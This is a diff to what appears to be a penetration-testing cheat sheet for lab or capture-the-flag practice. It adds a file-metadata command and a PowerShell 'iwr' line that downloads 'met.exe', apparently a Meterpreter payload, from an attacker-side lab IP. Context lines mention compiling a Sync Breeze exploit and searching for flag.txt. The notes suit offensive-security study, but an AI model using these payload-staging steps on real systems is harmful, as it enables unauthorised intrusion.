@@ -19,6 +19,12 @@ Google dork to search exploits (Instead of searchsploit):
 phpMyAdmin 4.9.2 site:exploit-db.com
 ```
 
+Extract metadata from a file
+
+```
+exiftool -a -u brochure.pdf
+```
+
 #### Windows
 
 PS - Get local user
@@ -44,4 +50,9 @@ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
 Find filename:
 ```shell
 dir -Path C:\  -Include flag.txt -File -Recurse -ErrorAction SilentlyContinue
+```
+
+Retrieve a file in Powershell (same as wget)
+```shell
+iwr -uri http://192.168.119.2/met.exe -Outfile met.exe
 ```
